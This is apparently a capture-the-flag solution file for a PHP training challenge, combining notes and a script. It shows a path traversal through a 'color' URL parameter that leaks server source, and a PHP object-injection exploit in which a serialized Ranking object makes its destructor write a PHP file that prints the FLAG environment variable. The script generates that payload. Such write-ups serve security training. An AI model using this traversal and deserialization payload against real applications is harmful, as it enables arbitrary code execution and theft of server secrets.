/*
The flag in in the FLAG environment variable

By changing the color of the page, we can see that the css is passed as a param in the url.
If we change this file name, we can print server code into the html head, which is where the css code is being printed.
So we can do: http://1024.training.jinblack.it/index.php?color=../index.php and read <head>

Under viewer.php if we "load replay", filenames and dirs get leaked.

Analysing server code:
- innerGame.php
    - in the Ranking class destruct, if '$changed' is true, the '$ranking' data gets serialized and written into the '$file' path file.

- viewer.php
    - when loading the replay file, its content gets unserialized and passed to a new Replay instance.

Exploit:
    - serialize a Ranking object with:
        - $changed = true
        - $path = path to file where to write $ranking
        - $ranking = php code to echo the FLAG env variable. It gets serialized but the code string remains.
    - Write the serialized object in a file.
    - Upload the file as a replay:
        - When pressing "load replay", the Ranking object will be created, we need to destroy it to call the destructor.
        - Just press "load replay" again
    - Go to http://1024.training.jinblack.it/<$path>

Solution:
 - Serialized object: O:7:"Ranking":3:{s:7:"ranking";s:28:"<?php echo getenv("FLAG") ?>";s:7:"changed";b:1;s:4:"path";s:21:"./games/echo_flag.php";}
 - Load it and reload
 - Go to: http://1024.training.jinblack.it/games/echo_flag.php
*/

<?php

class Ranking {
    public $ranking = [];
    public $changed = false;
    public $path = "./games/ranking";
}

$rank = new Ranking();

// We want to echo the flag, this gets serialized and written into the file in 'path', but the code string itself will remain untouched in the serialization, so we are writing php code into the html
$rank->ranking = "<?php echo getenv(\"FLAG\") ?>";
$rank->changed = true; //So its written in the destructor
$rank->path = "./games/echo_flag.php";

$serialized = serialize($rank);
echo $serialized . "\n";

$fp = fopen("exploit","wb");
fwrite($fp,$serialized);
fclose($fp);
echo "exploit file written \n";
?>
